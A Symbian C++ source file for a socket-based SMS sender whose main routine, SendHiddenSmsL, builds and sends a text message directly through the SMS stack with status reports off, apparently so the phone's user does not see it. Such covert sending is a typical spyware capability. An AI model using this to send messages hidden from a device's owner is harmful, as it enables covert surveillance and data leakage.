#include "SendSmsSocket.h"
#include <smsuaddr.h>	// KSmsAddrFamily
#include <gsmubuf.h>	// CSmsBuffer
#include <smsustrm.h>	// RSmsSocketReadStream
#include <smutset.h>
#include <smsclnt.h>


//Constructor
CSmsSenderSocket::CSmsSenderSocket(RSocketServ& aSocketServer, MSmsSendHandler* aHandler) :
	CActive(EPriorityStandard)
	{
	iHandler = aHandler;
	iSocketServer = &aSocketServer;
	}

CSmsSenderSocket* CSmsSenderSocket::NewL(RSocketServ& aSocketServer, MSmsSendHandler* aHandler)
	{
	CSmsSenderSocket* self = new (ELeave) CSmsSenderSocket(aSocketServer, aHandler);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CSmsSenderSocket::ConstructL()
	{
	CActiveScheduler::Add(this);
	__FLOG_OPEN("HT", "SendSms.txt");
	__FLOG(_L("**********"));

	User::LeaveIfError(iSendSocket.Open(*iSocketServer, KSMSAddrFamily, KSockDatagram, KSMSDatagramProtocol));

	TSmsAddr smsAddr;
	smsAddr.SetSmsAddrFamily(ESmsAddrSendOnly);
	iSendSocket.Bind(smsAddr);
	}

CSmsSenderSocket::~CSmsSenderSocket()
	{
	__FLOG(_L("Destructor"));
	Cancel();
	iSendSocket.Close();
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

void CSmsSenderSocket::DoCancel()
	{
	__FLOG(_L("Cancel"));
	iSendSocket.CancelIoctl();
	}


void CSmsSenderSocket::CleanNumber(TDes& aNumber)
	{
	TInt i = 0;
	while (i < aNumber.Length())
		{
		if ((aNumber[i] >= '0' && aNumber[i] <= '9') || aNumber[i] == '+')
			i++;
		else
			aNumber.Delete(i, 1);
		}
	}

void CSmsSenderSocket::SendHiddenSmsL(const TDesC& aNumber, const TDesC& aMessage)
	{
	__FLOG(_L("SendHiddenSmsL:"));
	__FLOG(aNumber);
	__FLOG(aMessage);

	RFs fs;
	User::LeaveIfError(fs.Connect());
	CleanupClosePushL(fs);
	CSmsMessage* msg = CSmsMessage::NewL(fs, CSmsPDU::ESmsSubmit, CSmsBuffer::NewL());
	CleanupStack::PushL(msg);

	__FLOG(_L("SetToFromAddr"));
	msg->Buffer().InsertL(0, aMessage);

	TBuf<30> cleanedNum = aNumber;
	CleanNumber(cleanedNum);
	__FLOG(_L("OrigNumber:"));
	__FLOG(aNumber);
	__FLOG(_L("CleanNumber:"));
	__FLOG(cleanedNum);
	msg->SetToFromAddressL(cleanedNum);

	// Set the Message Properties
	CSmsSubmit& submit = (CSmsSubmit &) msg->SmsPDU();

	submit.SetRejectDuplicates(ETrue);
	submit.SetReplyPath(EFalse);
	submit.SetStatusReportRequest(EFalse);
	submit.SetValidityPeriod(ESmsVPMaximum);

	// Absolute VP... ESmsVPFSemiOctet
	// Relative VP... ESmsVPFInteger
	submit.SetValidityPeriodFormat(TSmsFirstOctet::ESmsVPFInteger);
	submit.SetAlphabet(TSmsDataCodingScheme::ESmsAlphabet7Bit);

	if (submit.ProtocolIdentifierPresent())
		{
		__FLOG( _L("PID Present") );
		submit.SetPIDType(TSmsProtocolIdentifier::ESmsPIDTelematicInterworking); // bit 7-6
		submit.SetTelematicDeviceIndicator(TSmsProtocolIdentifier::ESmsNoTelematicDevice); // bit 5
		}

	RBuf sca( GetScaL() );
	sca.CleanupClosePushL();

	msg->SetServiceCenterAddressL(sca);
	
#ifndef __WINS__
	RSmsSocketWriteStream writeStream(iSendSocket);
	writeStream << *(msg);
	writeStream.CommitL();
	writeStream.Close();
#endif

	__FLOG(_L("Send - IOCTL"));
	CleanupStack::PopAndDestroy(&sca);
	__FLOG(_L("Msg"));
	CleanupStack::PopAndDestroy(msg);
	__FLOG(_L("Fs"));
	CleanupStack::PopAndDestroy(&fs);

	__FLOG(_L("SendSms"));
	// Send the sms...
	iOctlWrite() = KSockSelectWrite;
	iSendSocket.Ioctl(KIoctlSendSmsMessage, iStatus, &iOctlWrite, KSolSmsProv);
	SetActive();/**/

	__FLOG(_L("Ends"));
	}

void CSmsSenderSocket::RunL()
	{
	__FLOG(_L("RunL"));
	if (iHandler)
		iHandler->SmsSentL(iStatus.Int());
	__FLOG(_L("End RunL"));
	}

TInt CSmsSenderSocket::RunError(TInt aError)
	{
	__FLOG_1(_L("ERROR:%d"), aError);
	return aError;
	}

void CSmsSenderSocket::HandleSessionEventL(TMsvSessionEvent aEvent, TAny *aArg1, TAny *aArg2, TAny *aArg3)
	{
	}

HBufC* CSmsSenderSocket::GetScaL()
	{
	__FLOG(_L("GetScaL()"));
	CMsvSession* msvSession = CMsvSession::OpenSyncL(*this);
	CleanupStack::PushL(msvSession);

	CClientMtmRegistry* mtmReg = CClientMtmRegistry::NewL(*msvSession);
	CleanupStack::PushL(mtmReg);

	CSmsClientMtm* smsMtm = static_cast<CSmsClientMtm*> (mtmReg->NewMtmL(KUidMsgTypeSMS));
	CleanupStack::PushL(smsMtm);
	CSmsSettings& serviceSettings = smsMtm->ServiceSettings();

	HBufC* res = NULL;
	if (serviceSettings.ServiceCenterCount() > 0)
		{
		CSmsServiceCenter& num = serviceSettings.GetServiceCenter(serviceSettings.DefaultServiceCenter());
		res = num.Address().AllocL();
		__FLOG(_L("SCA Number:"));
		__FLOG(num.Address());
		}
	else
		{
		__FLOG(_L("SCA NOT Avail!"));
		res = HBufC::NewL(0);
		}
	CleanupStack::PopAndDestroy(smsMtm);
	CleanupStack::PopAndDestroy(mtmReg);
	CleanupStack::PopAndDestroy(msvSession);
	return res;
	}

